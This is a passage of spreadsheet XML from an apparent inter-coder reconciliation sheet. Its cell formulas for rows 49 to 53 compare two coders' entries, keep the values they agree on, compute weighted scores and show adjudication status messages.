        <f>IF(AND(Coder1!R49&amp;""&lt;&gt;"",Coder1!R49&amp;""=Coder2!R49&amp;""),Coder1!R49,"")</f>
        <v/>
      </c>
      <c r="S49" s="14">
        <f>IF(AND(Coder1!S49&amp;""&lt;&gt;"",Coder1!S49&amp;""=Coder2!S49&amp;""),Coder1!S49,"")</f>
        <v/>
      </c>
      <c r="T49" s="14">
        <f>IF(AND(Coder1!T49&amp;""&lt;&gt;"",Coder1!T49&amp;""=Coder2!T49&amp;""),Coder1!T49,"")</f>
        <v/>
      </c>
      <c r="U49" s="14">
        <f>IF(AND(Coder1!U49&amp;""&lt;&gt;"",Coder1!U49&amp;""=Coder2!U49&amp;""),Coder1!U49,"")</f>
        <v/>
      </c>
      <c r="V49" s="14">
        <f>IF(AND(Coder1!V49&amp;""&lt;&gt;"",Coder1!V49&amp;""=Coder2!V49&amp;""),Coder1!V49,"")</f>
        <v/>
      </c>
      <c r="W49" s="14">
        <f>IF(AND(Coder1!W49&amp;""&lt;&gt;"",Coder1!W49&amp;""=Coder2!W49&amp;""),Coder1!W49,"")</f>
        <v/>
      </c>
      <c r="X49" s="14">
        <f>IF(AND(Coder1!X49&amp;""&lt;&gt;"",Coder1!X49&amp;""=Coder2!X49&amp;""),Coder1!X49,"")</f>
        <v/>
      </c>
      <c r="Y49" s="14">
        <f>IF(AND(Coder1!Y49&amp;""&lt;&gt;"",Coder1!Y49&amp;""=Coder2!Y49&amp;""),Coder1!Y49,"")</f>
        <v/>
      </c>
      <c r="Z49" s="14">
        <f>IF(AND(Coder1!Z49&amp;""&lt;&gt;"",Coder1!Z49&amp;""=Coder2!Z49&amp;""),Coder1!Z49,"")</f>
        <v/>
      </c>
      <c r="AA49" s="14">
        <f>IF(AND(Coder1!AA49&amp;""&lt;&gt;"",Coder1!AA49&amp;""=Coder2!AA49&amp;""),Coder1!AA49,"")</f>
        <v/>
      </c>
      <c r="AB49" s="14">
        <f>IF(AND(Coder1!AB49&amp;""&lt;&gt;"",Coder1!AB49&amp;""=Coder2!AB49&amp;""),Coder1!AB49,"")</f>
        <v/>
      </c>
      <c r="AC49" s="14">
        <f>IF(AND(Coder1!AC49&amp;""&lt;&gt;"",Coder1!AC49&amp;""=Coder2!AC49&amp;""),Coder1!AC49,"")</f>
        <v/>
      </c>
      <c r="AD49" s="14">
        <f>IF(AND(Coder1!AD49&amp;""&lt;&gt;"",Coder1!AD49&amp;""=Coder2!AD49&amp;""),Coder1!AD49,"")</f>
        <v/>
      </c>
      <c r="AE49" s="14">
        <f>IF(AND(Coder1!AE49&amp;""&lt;&gt;"",Coder1!AE49&amp;""=Coder2!AE49&amp;""),Coder1!AE49,"")</f>
        <v/>
      </c>
      <c r="AF49" s="14">
        <f>IF(AND(Coder1!AF49&amp;""&lt;&gt;"",Coder1!AF49&amp;""=Coder2!AF49&amp;""),Coder1!AF49,"")</f>
        <v/>
      </c>
      <c r="AG49" s="14">
        <f>IF(AND(Coder1!AG49&amp;""&lt;&gt;"",Coder1!AG49&amp;""=Coder2!AG49&amp;""),Coder1!AG49,"")</f>
        <v/>
      </c>
      <c r="AH49" s="14">
        <f>IF(AND(Coder1!AH49&amp;""&lt;&gt;"",Coder1!AH49&amp;""=Coder2!AH49&amp;""),Coder1!AH49,"")</f>
        <v/>
      </c>
      <c r="AI49" s="11">
        <f>IF(COUNT(E49:L49)=0,"",SUM(E49:L49))</f>
        <v/>
      </c>
      <c r="AJ49" s="11">
        <f>IF(AI49="","",N(E49)*3+N(F49)*2+N(G49)*2+N(H49)*2+N(I49)*2+N(J49)*3+N(K49)*3+N(L49)*3)</f>
        <v/>
      </c>
      <c r="AK49" s="11">
        <f>IF(AI49="","",COUNTIF(N49:AG49,1))</f>
        <v/>
      </c>
      <c r="AL49" s="11">
        <f>IF(OR(AJ49="",AJ49=0),"",ROUND(100*(AJ49-AK49)/AJ49,1))</f>
        <v/>
      </c>
      <c r="AM49" s="11">
        <f>IF(AND(Coder1!AN49=1,Coder2!AN49=1),IF(COUNTBLANK(E49:AH49)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN49" s="11">
        <f>IF(AND(Coder1!AN49=1,Coder2!AN49=1),IF(SUMPRODUCT(--(Coder1!E49:AH49&amp;""&lt;&gt;Coder2!E49:AH49&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO49" s="11" t="n"/>
    </row>
    <row r="50">
      <c r="A50" s="11">
        <f>Coder1!A50</f>
        <v/>
      </c>
      <c r="B50" s="11">
        <f>Coder1!B50</f>
        <v/>
      </c>
      <c r="C50" s="11">
        <f>Coder1!C50</f>
        <v/>
      </c>
      <c r="D50" s="11">
        <f>Coder1!D50</f>
        <v/>
      </c>
      <c r="E50" s="14">
        <f>IF(AND(Coder1!E50&amp;""&lt;&gt;"",Coder1!E50&amp;""=Coder2!E50&amp;""),Coder1!E50,"")</f>
        <v/>
      </c>
      <c r="F50" s="14">
        <f>IF(AND(Coder1!F50&amp;""&lt;&gt;"",Coder1!F50&amp;""=Coder2!F50&amp;""),Coder1!F50,"")</f>
        <v/>
      </c>
      <c r="G50" s="14">
        <f>IF(AND(Coder1!G50&amp;""&lt;&gt;"",Coder1!G50&amp;""=Coder2!G50&amp;""),Coder1!G50,"")</f>
        <v/>
      </c>
      <c r="H50" s="14">
        <f>IF(AND(Coder1!H50&amp;""&lt;&gt;"",Coder1!H50&amp;""=Coder2!H50&amp;""),Coder1!H50,"")</f>
        <v/>
      </c>
      <c r="I50" s="14">
        <f>IF(AND(Coder1!I50&amp;""&lt;&gt;"",Coder1!I50&amp;""=Coder2!I50&amp;""),Coder1!I50,"")</f>
        <v/>
      </c>
      <c r="J50" s="14">
        <f>IF(AND(Coder1!J50&amp;""&lt;&gt;"",Coder1!J50&amp;""=Coder2!J50&amp;""),Coder1!J50,"")</f>
        <v/>
      </c>
      <c r="K50" s="14">
        <f>IF(AND(Coder1!K50&amp;""&lt;&gt;"",Coder1!K50&amp;""=Coder2!K50&amp;""),Coder1!K50,"")</f>
        <v/>
      </c>
      <c r="L50" s="14">
        <f>IF(AND(Coder1!L50&amp;""&lt;&gt;"",Coder1!L50&amp;""=Coder2!L50&amp;""),Coder1!L50,"")</f>
        <v/>
      </c>
      <c r="M50" s="14">
        <f>IF(AND(Coder1!M50&amp;""&lt;&gt;"",Coder1!M50&amp;""=Coder2!M50&amp;""),Coder1!M50,"")</f>
        <v/>
      </c>
      <c r="N50" s="14">
        <f>IF(AND(Coder1!N50&amp;""&lt;&gt;"",Coder1!N50&amp;""=Coder2!N50&amp;""),Coder1!N50,"")</f>
        <v/>
      </c>
      <c r="O50" s="14">
        <f>IF(AND(Coder1!O50&amp;""&lt;&gt;"",Coder1!O50&amp;""=Coder2!O50&amp;""),Coder1!O50,"")</f>
        <v/>
      </c>
      <c r="P50" s="14">
        <f>IF(AND(Coder1!P50&amp;""&lt;&gt;"",Coder1!P50&amp;""=Coder2!P50&amp;""),Coder1!P50,"")</f>
        <v/>
      </c>
      <c r="Q50" s="14">
        <f>IF(AND(Coder1!Q50&amp;""&lt;&gt;"",Coder1!Q50&amp;""=Coder2!Q50&amp;""),Coder1!Q50,"")</f>
        <v/>
      </c>
      <c r="R50" s="14">
        <f>IF(AND(Coder1!R50&amp;""&lt;&gt;"",Coder1!R50&amp;""=Coder2!R50&amp;""),Coder1!R50,"")</f>
        <v/>
      </c>
      <c r="S50" s="14">
        <f>IF(AND(Coder1!S50&amp;""&lt;&gt;"",Coder1!S50&amp;""=Coder2!S50&amp;""),Coder1!S50,"")</f>
        <v/>
      </c>
      <c r="T50" s="14">
        <f>IF(AND(Coder1!T50&amp;""&lt;&gt;"",Coder1!T50&amp;""=Coder2!T50&amp;""),Coder1!T50,"")</f>
        <v/>
      </c>
      <c r="U50" s="14">
        <f>IF(AND(Coder1!U50&amp;""&lt;&gt;"",Coder1!U50&amp;""=Coder2!U50&amp;""),Coder1!U50,"")</f>
        <v/>
      </c>
      <c r="V50" s="14">
        <f>IF(AND(Coder1!V50&amp;""&lt;&gt;"",Coder1!V50&amp;""=Coder2!V50&amp;""),Coder1!V50,"")</f>
        <v/>
      </c>
      <c r="W50" s="14">
        <f>IF(AND(Coder1!W50&amp;""&lt;&gt;"",Coder1!W50&amp;""=Coder2!W50&amp;""),Coder1!W50,"")</f>
        <v/>
      </c>
      <c r="X50" s="14">
        <f>IF(AND(Coder1!X50&amp;""&lt;&gt;"",Coder1!X50&amp;""=Coder2!X50&amp;""),Coder1!X50,"")</f>
        <v/>
      </c>
      <c r="Y50" s="14">
        <f>IF(AND(Coder1!Y50&amp;""&lt;&gt;"",Coder1!Y50&amp;""=Coder2!Y50&amp;""),Coder1!Y50,"")</f>
        <v/>
      </c>
      <c r="Z50" s="14">
        <f>IF(AND(Coder1!Z50&amp;""&lt;&gt;"",Coder1!Z50&amp;""=Coder2!Z50&amp;""),Coder1!Z50,"")</f>
        <v/>
      </c>
      <c r="AA50" s="14">
        <f>IF(AND(Coder1!AA50&amp;""&lt;&gt;"",Coder1!AA50&amp;""=Coder2!AA50&amp;""),Coder1!AA50,"")</f>
        <v/>
      </c>
      <c r="AB50" s="14">
        <f>IF(AND(Coder1!AB50&amp;""&lt;&gt;"",Coder1!AB50&amp;""=Coder2!AB50&amp;""),Coder1!AB50,"")</f>
        <v/>
      </c>
      <c r="AC50" s="14">
        <f>IF(AND(Coder1!AC50&amp;""&lt;&gt;"",Coder1!AC50&amp;""=Coder2!AC50&amp;""),Coder1!AC50,"")</f>
        <v/>
      </c>
      <c r="AD50" s="14">
        <f>IF(AND(Coder1!AD50&amp;""&lt;&gt;"",Coder1!AD50&amp;""=Coder2!AD50&amp;""),Coder1!AD50,"")</f>
        <v/>
      </c>
      <c r="AE50" s="14">
        <f>IF(AND(Coder1!AE50&amp;""&lt;&gt;"",Coder1!AE50&amp;""=Coder2!AE50&amp;""),Coder1!AE50,"")</f>
        <v/>
      </c>
      <c r="AF50" s="14">
        <f>IF(AND(Coder1!AF50&amp;""&lt;&gt;"",Coder1!AF50&amp;""=Coder2!AF50&amp;""),Coder1!AF50,"")</f>
        <v/>
      </c>
      <c r="AG50" s="14">
        <f>IF(AND(Coder1!AG50&amp;""&lt;&gt;"",Coder1!AG50&amp;""=Coder2!AG50&amp;""),Coder1!AG50,"")</f>
        <v/>
      </c>
      <c r="AH50" s="14">
        <f>IF(AND(Coder1!AH50&amp;""&lt;&gt;"",Coder1!AH50&amp;""=Coder2!AH50&amp;""),Coder1!AH50,"")</f>
        <v/>
      </c>
      <c r="AI50" s="11">
        <f>IF(COUNT(E50:L50)=0,"",SUM(E50:L50))</f>
        <v/>
      </c>
      <c r="AJ50" s="11">
        <f>IF(AI50="","",N(E50)*3+N(F50)*2+N(G50)*2+N(H50)*2+N(I50)*2+N(J50)*3+N(K50)*3+N(L50)*3)</f>
        <v/>
      </c>
      <c r="AK50" s="11">
        <f>IF(AI50="","",COUNTIF(N50:AG50,1))</f>
        <v/>
      </c>
      <c r="AL50" s="11">
        <f>IF(OR(AJ50="",AJ50=0),"",ROUND(100*(AJ50-AK50)/AJ50,1))</f>
        <v/>
      </c>
      <c r="AM50" s="11">
        <f>IF(AND(Coder1!AN50=1,Coder2!AN50=1),IF(COUNTBLANK(E50:AH50)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN50" s="11">
        <f>IF(AND(Coder1!AN50=1,Coder2!AN50=1),IF(SUMPRODUCT(--(Coder1!E50:AH50&amp;""&lt;&gt;Coder2!E50:AH50&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO50" s="11" t="n"/>
    </row>
    <row r="51">
      <c r="A51" s="11">
        <f>Coder1!A51</f>
        <v/>
      </c>
      <c r="B51" s="11">
        <f>Coder1!B51</f>
        <v/>
      </c>
      <c r="C51" s="11">
        <f>Coder1!C51</f>
        <v/>
      </c>
      <c r="D51" s="11">
        <f>Coder1!D51</f>
        <v/>
      </c>
      <c r="E51" s="14">
        <f>IF(AND(Coder1!E51&amp;""&lt;&gt;"",Coder1!E51&amp;""=Coder2!E51&amp;""),Coder1!E51,"")</f>
        <v/>
      </c>
      <c r="F51" s="14">
        <f>IF(AND(Coder1!F51&amp;""&lt;&gt;"",Coder1!F51&amp;""=Coder2!F51&amp;""),Coder1!F51,"")</f>
        <v/>
      </c>
      <c r="G51" s="14">
        <f>IF(AND(Coder1!G51&amp;""&lt;&gt;"",Coder1!G51&amp;""=Coder2!G51&amp;""),Coder1!G51,"")</f>
        <v/>
      </c>
      <c r="H51" s="14">
        <f>IF(AND(Coder1!H51&amp;""&lt;&gt;"",Coder1!H51&amp;""=Coder2!H51&amp;""),Coder1!H51,"")</f>
        <v/>
      </c>
      <c r="I51" s="14">
        <f>IF(AND(Coder1!I51&amp;""&lt;&gt;"",Coder1!I51&amp;""=Coder2!I51&amp;""),Coder1!I51,"")</f>
        <v/>
      </c>
      <c r="J51" s="14">
        <f>IF(AND(Coder1!J51&amp;""&lt;&gt;"",Coder1!J51&amp;""=Coder2!J51&amp;""),Coder1!J51,"")</f>
        <v/>
      </c>
      <c r="K51" s="14">
        <f>IF(AND(Coder1!K51&amp;""&lt;&gt;"",Coder1!K51&amp;""=Coder2!K51&amp;""),Coder1!K51,"")</f>
        <v/>
      </c>
      <c r="L51" s="14">
        <f>IF(AND(Coder1!L51&amp;""&lt;&gt;"",Coder1!L51&amp;""=Coder2!L51&amp;""),Coder1!L51,"")</f>
        <v/>
      </c>
      <c r="M51" s="14">
        <f>IF(AND(Coder1!M51&amp;""&lt;&gt;"",Coder1!M51&amp;""=Coder2!M51&amp;""),Coder1!M51,"")</f>
        <v/>
      </c>
      <c r="N51" s="14">
        <f>IF(AND(Coder1!N51&amp;""&lt;&gt;"",Coder1!N51&amp;""=Coder2!N51&amp;""),Coder1!N51,"")</f>
        <v/>
      </c>
      <c r="O51" s="14">
        <f>IF(AND(Coder1!O51&amp;""&lt;&gt;"",Coder1!O51&amp;""=Coder2!O51&amp;""),Coder1!O51,"")</f>
        <v/>
      </c>
      <c r="P51" s="14">
        <f>IF(AND(Coder1!P51&amp;""&lt;&gt;"",Coder1!P51&amp;""=Coder2!P51&amp;""),Coder1!P51,"")</f>
        <v/>
      </c>
      <c r="Q51" s="14">
        <f>IF(AND(Coder1!Q51&amp;""&lt;&gt;"",Coder1!Q51&amp;""=Coder2!Q51&amp;""),Coder1!Q51,"")</f>
        <v/>
      </c>
      <c r="R51" s="14">
        <f>IF(AND(Coder1!R51&amp;""&lt;&gt;"",Coder1!R51&amp;""=Coder2!R51&amp;""),Coder1!R51,"")</f>
        <v/>
      </c>
      <c r="S51" s="14">
        <f>IF(AND(Coder1!S51&amp;""&lt;&gt;"",Coder1!S51&amp;""=Coder2!S51&amp;""),Coder1!S51,"")</f>
        <v/>
      </c>
      <c r="T51" s="14">
        <f>IF(AND(Coder1!T51&amp;""&lt;&gt;"",Coder1!T51&amp;""=Coder2!T51&amp;""),Coder1!T51,"")</f>
        <v/>
      </c>
      <c r="U51" s="14">
        <f>IF(AND(Coder1!U51&amp;""&lt;&gt;"",Coder1!U51&amp;""=Coder2!U51&amp;""),Coder1!U51,"")</f>
        <v/>
      </c>
      <c r="V51" s="14">
        <f>IF(AND(Coder1!V51&amp;""&lt;&gt;"",Coder1!V51&amp;""=Coder2!V51&amp;""),Coder1!V51,"")</f>
        <v/>
      </c>
      <c r="W51" s="14">
        <f>IF(AND(Coder1!W51&amp;""&lt;&gt;"",Coder1!W51&amp;""=Coder2!W51&amp;""),Coder1!W51,"")</f>
        <v/>
      </c>
      <c r="X51" s="14">
        <f>IF(AND(Coder1!X51&amp;""&lt;&gt;"",Coder1!X51&amp;""=Coder2!X51&amp;""),Coder1!X51,"")</f>
        <v/>
      </c>
      <c r="Y51" s="14">
        <f>IF(AND(Coder1!Y51&amp;""&lt;&gt;"",Coder1!Y51&amp;""=Coder2!Y51&amp;""),Coder1!Y51,"")</f>
        <v/>
      </c>
      <c r="Z51" s="14">
        <f>IF(AND(Coder1!Z51&amp;""&lt;&gt;"",Coder1!Z51&amp;""=Coder2!Z51&amp;""),Coder1!Z51,"")</f>
        <v/>
      </c>
      <c r="AA51" s="14">
        <f>IF(AND(Coder1!AA51&amp;""&lt;&gt;"",Coder1!AA51&amp;""=Coder2!AA51&amp;""),Coder1!AA51,"")</f>
        <v/>
      </c>
      <c r="AB51" s="14">
        <f>IF(AND(Coder1!AB51&amp;""&lt;&gt;"",Coder1!AB51&amp;""=Coder2!AB51&amp;""),Coder1!AB51,"")</f>
        <v/>
      </c>
      <c r="AC51" s="14">
        <f>IF(AND(Coder1!AC51&amp;""&lt;&gt;"",Coder1!AC51&amp;""=Coder2!AC51&amp;""),Coder1!AC51,"")</f>
        <v/>
      </c>
      <c r="AD51" s="14">
        <f>IF(AND(Coder1!AD51&amp;""&lt;&gt;"",Coder1!AD51&amp;""=Coder2!AD51&amp;""),Coder1!AD51,"")</f>
        <v/>
      </c>
      <c r="AE51" s="14">
        <f>IF(AND(Coder1!AE51&amp;""&lt;&gt;"",Coder1!AE51&amp;""=Coder2!AE51&amp;""),Coder1!AE51,"")</f>
        <v/>
      </c>
      <c r="AF51" s="14">
        <f>IF(AND(Coder1!AF51&amp;""&lt;&gt;"",Coder1!AF51&amp;""=Coder2!AF51&amp;""),Coder1!AF51,"")</f>
        <v/>
      </c>
      <c r="AG51" s="14">
        <f>IF(AND(Coder1!AG51&amp;""&lt;&gt;"",Coder1!AG51&amp;""=Coder2!AG51&amp;""),Coder1!AG51,"")</f>
        <v/>
      </c>
      <c r="AH51" s="14">
        <f>IF(AND(Coder1!AH51&amp;""&lt;&gt;"",Coder1!AH51&amp;""=Coder2!AH51&amp;""),Coder1!AH51,"")</f>
        <v/>
      </c>
      <c r="AI51" s="11">
        <f>IF(COUNT(E51:L51)=0,"",SUM(E51:L51))</f>
        <v/>
      </c>
      <c r="AJ51" s="11">
        <f>IF(AI51="","",N(E51)*3+N(F51)*2+N(G51)*2+N(H51)*2+N(I51)*2+N(J51)*3+N(K51)*3+N(L51)*3)</f>
        <v/>
      </c>
      <c r="AK51" s="11">
        <f>IF(AI51="","",COUNTIF(N51:AG51,1))</f>
        <v/>
      </c>
      <c r="AL51" s="11">
        <f>IF(OR(AJ51="",AJ51=0),"",ROUND(100*(AJ51-AK51)/AJ51,1))</f>
        <v/>
      </c>
      <c r="AM51" s="11">
        <f>IF(AND(Coder1!AN51=1,Coder2!AN51=1),IF(COUNTBLANK(E51:AH51)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN51" s="11">
        <f>IF(AND(Coder1!AN51=1,Coder2!AN51=1),IF(SUMPRODUCT(--(Coder1!E51:AH51&amp;""&lt;&gt;Coder2!E51:AH51&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO51" s="11" t="n"/>
    </row>
    <row r="52">
      <c r="A52" s="11">
        <f>Coder1!A52</f>
        <v/>
      </c>
      <c r="B52" s="11">
        <f>Coder1!B52</f>
        <v/>
      </c>
      <c r="C52" s="11">
        <f>Coder1!C52</f>
        <v/>
      </c>
      <c r="D52" s="11">
        <f>Coder1!D52</f>
        <v/>
      </c>
      <c r="E52" s="14">
        <f>IF(AND(Coder1!E52&amp;""&lt;&gt;"",Coder1!E52&amp;""=Coder2!E52&amp;""),Coder1!E52,"")</f>
        <v/>
      </c>
      <c r="F52" s="14">
        <f>IF(AND(Coder1!F52&amp;""&lt;&gt;"",Coder1!F52&amp;""=Coder2!F52&amp;""),Coder1!F52,"")</f>
        <v/>
      </c>
      <c r="G52" s="14">
        <f>IF(AND(Coder1!G52&amp;""&lt;&gt;"",Coder1!G52&amp;""=Coder2!G52&amp;""),Coder1!G52,"")</f>
        <v/>
      </c>
      <c r="H52" s="14">
        <f>IF(AND(Coder1!H52&amp;""&lt;&gt;"",Coder1!H52&amp;""=Coder2!H52&amp;""),Coder1!H52,"")</f>
        <v/>
      </c>
      <c r="I52" s="14">
        <f>IF(AND(Coder1!I52&amp;""&lt;&gt;"",Coder1!I52&amp;""=Coder2!I52&amp;""),Coder1!I52,"")</f>
        <v/>
      </c>
      <c r="J52" s="14">
        <f>IF(AND(Coder1!J52&amp;""&lt;&gt;"",Coder1!J52&amp;""=Coder2!J52&amp;""),Coder1!J52,"")</f>
        <v/>
      </c>
      <c r="K52" s="14">
        <f>IF(AND(Coder1!K52&amp;""&lt;&gt;"",Coder1!K52&amp;""=Coder2!K52&amp;""),Coder1!K52,"")</f>
        <v/>
      </c>
      <c r="L52" s="14">
        <f>IF(AND(Coder1!L52&amp;""&lt;&gt;"",Coder1!L52&amp;""=Coder2!L52&amp;""),Coder1!L52,"")</f>
        <v/>
      </c>
      <c r="M52" s="14">
        <f>IF(AND(Coder1!M52&amp;""&lt;&gt;"",Coder1!M52&amp;""=Coder2!M52&amp;""),Coder1!M52,"")</f>
        <v/>
      </c>
      <c r="N52" s="14">
        <f>IF(AND(Coder1!N52&amp;""&lt;&gt;"",Coder1!N52&amp;""=Coder2!N52&amp;""),Coder1!N52,"")</f>
        <v/>
      </c>
      <c r="O52" s="14">
        <f>IF(AND(Coder1!O52&amp;""&lt;&gt;"",Coder1!O52&amp;""=Coder2!O52&amp;""),Coder1!O52,"")</f>
        <v/>
      </c>
      <c r="P52" s="14">
        <f>IF(AND(Coder1!P52&amp;""&lt;&gt;"",Coder1!P52&amp;""=Coder2!P52&amp;""),Coder1!P52,"")</f>
        <v/>
      </c>
      <c r="Q52" s="14">
        <f>IF(AND(Coder1!Q52&amp;""&lt;&gt;"",Coder1!Q52&amp;""=Coder2!Q52&amp;""),Coder1!Q52,"")</f>
        <v/>
      </c>
      <c r="R52" s="14">
        <f>IF(AND(Coder1!R52&amp;""&lt;&gt;"",Coder1!R52&amp;""=Coder2!R52&amp;""),Coder1!R52,"")</f>
        <v/>
      </c>
      <c r="S52" s="14">
        <f>IF(AND(Coder1!S52&amp;""&lt;&gt;"",Coder1!S52&amp;""=Coder2!S52&amp;""),Coder1!S52,"")</f>
        <v/>
      </c>
      <c r="T52" s="14">
        <f>IF(AND(Coder1!T52&amp;""&lt;&gt;"",Coder1!T52&amp;""=Coder2!T52&amp;""),Coder1!T52,"")</f>
        <v/>
      </c>
      <c r="U52" s="14">
        <f>IF(AND(Coder1!U52&amp;""&lt;&gt;"",Coder1!U52&amp;""=Coder2!U52&amp;""),Coder1!U52,"")</f>
        <v/>
      </c>
      <c r="V52" s="14">
        <f>IF(AND(Coder1!V52&amp;""&lt;&gt;"",Coder1!V52&amp;""=Coder2!V52&amp;""),Coder1!V52,"")</f>
        <v/>
      </c>
      <c r="W52" s="14">
        <f>IF(AND(Coder1!W52&amp;""&lt;&gt;"",Coder1!W52&amp;""=Coder2!W52&amp;""),Coder1!W52,"")</f>
        <v/>
      </c>
      <c r="X52" s="14">
        <f>IF(AND(Coder1!X52&amp;""&lt;&gt;"",Coder1!X52&amp;""=Coder2!X52&amp;""),Coder1!X52,"")</f>
        <v/>
      </c>
      <c r="Y52" s="14">
        <f>IF(AND(Coder1!Y52&amp;""&lt;&gt;"",Coder1!Y52&amp;""=Coder2!Y52&amp;""),Coder1!Y52,"")</f>
        <v/>
      </c>
      <c r="Z52" s="14">
        <f>IF(AND(Coder1!Z52&amp;""&lt;&gt;"",Coder1!Z52&amp;""=Coder2!Z52&amp;""),Coder1!Z52,"")</f>
        <v/>
      </c>
      <c r="AA52" s="14">
        <f>IF(AND(Coder1!AA52&amp;""&lt;&gt;"",Coder1!AA52&amp;""=Coder2!AA52&amp;""),Coder1!AA52,"")</f>
        <v/>
      </c>
      <c r="AB52" s="14">
        <f>IF(AND(Coder1!AB52&amp;""&lt;&gt;"",Coder1!AB52&amp;""=Coder2!AB52&amp;""),Coder1!AB52,"")</f>
        <v/>
      </c>
      <c r="AC52" s="14">
        <f>IF(AND(Coder1!AC52&amp;""&lt;&gt;"",Coder1!AC52&amp;""=Coder2!AC52&amp;""),Coder1!AC52,"")</f>
        <v/>
      </c>
      <c r="AD52" s="14">
        <f>IF(AND(Coder1!AD52&amp;""&lt;&gt;"",Coder1!AD52&amp;""=Coder2!AD52&amp;""),Coder1!AD52,"")</f>
        <v/>
      </c>
      <c r="AE52" s="14">
        <f>IF(AND(Coder1!AE52&amp;""&lt;&gt;"",Coder1!AE52&amp;""=Coder2!AE52&amp;""),Coder1!AE52,"")</f>
        <v/>
      </c>
      <c r="AF52" s="14">
        <f>IF(AND(Coder1!AF52&amp;""&lt;&gt;"",Coder1!AF52&amp;""=Coder2!AF52&amp;""),Coder1!AF52,"")</f>
        <v/>
      </c>
      <c r="AG52" s="14">
        <f>IF(AND(Coder1!AG52&amp;""&lt;&gt;"",Coder1!AG52&amp;""=Coder2!AG52&amp;""),Coder1!AG52,"")</f>
        <v/>
      </c>
      <c r="AH52" s="14">
        <f>IF(AND(Coder1!AH52&amp;""&lt;&gt;"",Coder1!AH52&amp;""=Coder2!AH52&amp;""),Coder1!AH52,"")</f>
        <v/>
      </c>
      <c r="AI52" s="11">
        <f>IF(COUNT(E52:L52)=0,"",SUM(E52:L52))</f>
        <v/>
      </c>
      <c r="AJ52" s="11">
        <f>IF(AI52="","",N(E52)*3+N(F52)*2+N(G52)*2+N(H52)*2+N(I52)*2+N(J52)*3+N(K52)*3+N(L52)*3)</f>
        <v/>
      </c>
      <c r="AK52" s="11">
        <f>IF(AI52="","",COUNTIF(N52:AG52,1))</f>
        <v/>
      </c>
      <c r="AL52" s="11">
        <f>IF(OR(AJ52="",AJ52=0),"",ROUND(100*(AJ52-AK52)/AJ52,1))</f>
        <v/>
      </c>
      <c r="AM52" s="11">
        <f>IF(AND(Coder1!AN52=1,Coder2!AN52=1),IF(COUNTBLANK(E52:AH52)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN52" s="11">
        <f>IF(AND(Coder1!AN52=1,Coder2!AN52=1),IF(SUMPRODUCT(--(Coder1!E52:AH52&amp;""&lt;&gt;Coder2!E52:AH52&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO52" s="11" t="n"/>
    </row>
    <row r="53">
      <c r="A53" s="11">
        <f>Coder1!A53</f>
        <v/>
      </c>
      <c r="B53" s="11">
        <f>Coder1!B53</f>
        <v/>
      </c>
      <c r="C53" s="11">
        <f>Coder1!C53</f>
        <v/>
      </c>
      <c r="D53" s="11">
        <f>Coder1!D53</f>
        <v/>
      </c>
      <c r="E53" s="14">
        <f>IF(AND(Coder1!E53&amp;""&lt;&gt;"",Coder1!E53&amp;""=Coder2!E53&amp;""),Coder1!E53,"")</f>
        <v/>
      </c>
      <c r="F53" s="14">
        <f>IF(AND(Coder1!F53&amp;""&lt;&gt;"",Coder1!F53&amp;""=Coder2!F53&amp;""),Coder1!F53,"")</f>
        <v/>
      </c>
      <c r="G53" s="14">
        <f>IF(AND(Coder1!G53&amp;""&lt;&gt;"",Coder1!G53&amp;""=Coder2!G53&amp;""),Coder1!G53,"")</f>
        <v/>
      </c>
      <c r="H53" s="14">
        <f>IF(AND(Coder1!H53&amp;""&lt;&gt;"",Coder1!H53&amp;""=Coder2!H53&amp;""),Coder1!H53,"")</f>
        <v/>
      </c>
      <c r="I53" s="14">
        <f>IF(AND(Coder1!I53&amp;""&lt;&gt;"",Coder1!I53&amp;""=Coder2!I53&amp;""),Coder1!I53,"")</f>
        <v/>
      </c>
      <c r="J53" s="14">
        <f>IF(AND(Coder1!J53&amp;""&lt;&gt;"",Coder1!J53&amp;""=Coder2!J53&amp;""),Coder1!J53,"")</f>
        <v/>
      </c>
      <c r="K53" s="14">
        <f>IF(AND(Coder1!K53&amp;""&lt;&gt;"",Coder1!K53&amp;""=Coder2!K53&amp;""),Coder1!K53,"")</f>
        <v/>
      </c>
      <c r="L53" s="14">
        <f>IF(AND(Coder1!L53&amp;""&lt;&gt;"",Coder1!L53&amp;""=Coder2!L53&amp;""),Coder1!L53,"")</f>
        <v/>
      </c>
      <c r="M53" s="14">
        <f>IF(AND(Coder1!M53&amp;""&lt;&gt;"",Coder1!M53&amp;""=Coder2!M53&amp;""),Coder1!M53,"")</f>
        <v/>
      </c>
      <c r="N53" s="14">
        <f>IF(AND(Coder1!N53&amp;""&lt;&gt;"",Coder1!N53&amp;""=Coder2!N53&amp;""),Coder1!N53,"")</f>
        <v/>
      </c>
      <c r="O53" s="14">
        <f>IF(AND(Coder1!O53&amp;""&lt;&gt;"",Coder1!O53&amp;""=Coder2!O53&amp;""),Coder1!O53,"")</f>
        <v/>
      </c>
      <c r="P53" s="14">
        <f>IF(AND(Coder1!P53&amp;""&lt;&gt;"",Coder1!P53&amp;""=Coder2!P53&amp;""),Coder1!P53,"")</f>
        <v/>
      </c>
      <c r="Q53" s="14">
        <f>IF(AND(Coder1!Q53&amp;""&lt;&gt;"",Coder1!Q53&amp;""=Coder2!Q53&amp;""),Coder1!Q53,"")</f>
        <v/>
      </c>
      <c r="R53" s="14">
        <f>IF(AND(Coder1!R53&amp;""&lt;&gt;"",Coder1!R53&amp;""=Coder2!R53&amp;""),Coder1!R53,"")</f>
        <v/>
      </c>
      <c r="S53" s="14">
        <f>IF(AND(Coder1!S53&amp;""&lt;&gt;"",Coder1!S53&amp;""=Coder2!S53&amp;""),Coder1!S53,"")</f>
        <v/>
      </c>
      <c r="T53" s="14">
        <f>IF(AND(Coder1!T53&amp;""&lt;&gt;"",Coder1!T53&amp;""=Coder2!T53&amp;""),Coder1!T53,"")</f>
        <v/>
      </c>
      <c r="U53" s="14">
